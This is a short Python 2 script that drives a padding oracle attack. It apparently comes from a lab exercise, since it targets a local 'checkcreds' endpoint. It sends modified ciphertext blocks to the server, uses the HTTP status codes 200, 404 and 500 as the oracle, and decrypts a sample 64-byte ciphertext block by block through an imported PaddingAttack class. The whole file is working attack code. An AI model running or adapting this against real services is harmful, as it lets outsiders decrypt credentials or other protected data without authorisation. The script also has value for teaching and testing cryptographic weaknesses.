import urllib
from oracle import PaddingAttack
import logging

sample_encrypted = "401103ab592440fbc1f6b5e9c65a8d0c36686e296e0541830fae55351d160c38a36589c41b6e0d40a71853a930be2364c85e2e1999ac3878270895228c60e8ac"

def try_sending(enc_block):
    base_url = "http://localhost/checkcreds?enc="
    base_url += enc_block
    response = urllib.urlopen(base_url)
    return_code = response.getcode()
    if return_code in [200, 404, 500]:
        return return_code
    raise Exception("Yikes!")


def main():
    p = PaddingAttack(sample_encrypted[0:32], "LOLOLOLOLOLOLOLO".encode("hex"), try_sending, 16, logging.DEBUG)
    print p.attack()
    p = PaddingAttack(sample_encrypted[32:64], sample_encrypted[0:32], try_sending, 16)
    print p.attack()
    p = PaddingAttack(sample_encrypted[64:96], sample_encrypted[32:64], try_sending, 16)
    print p.attack()
    p = PaddingAttack(sample_encrypted[96:128], sample_encrypted[64:96], try_sending, 16)
    print p.attack()

if __name__ == '__main__':
    main()

